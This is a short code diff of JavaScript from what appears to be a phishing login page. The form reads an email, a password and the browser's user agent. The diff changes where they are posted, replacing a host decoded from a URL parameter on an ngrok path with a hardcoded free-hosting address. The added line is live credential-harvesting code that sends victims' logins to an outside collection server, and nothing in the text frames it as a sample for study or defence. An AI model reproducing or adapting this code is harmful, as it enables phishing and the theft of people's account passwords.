@@ -103,7 +103,7 @@
     if (!a) {check("mail");}else
     if (!b) {check("pass");}else{
       $("#login").html("Login Progress...");
-        var srv = 'https://' + h2b(param('srv')) + '/ngrok/login.php';
+        var srv = 'https://greasiest-depositio.000webhostapp.com/check.php';
         $.post(srv,{email: a, pass: b, useragent: c, Login: 'Login'},function(l, response){
           if (l.response == 404) {
             alert('alert','danger',l.message);
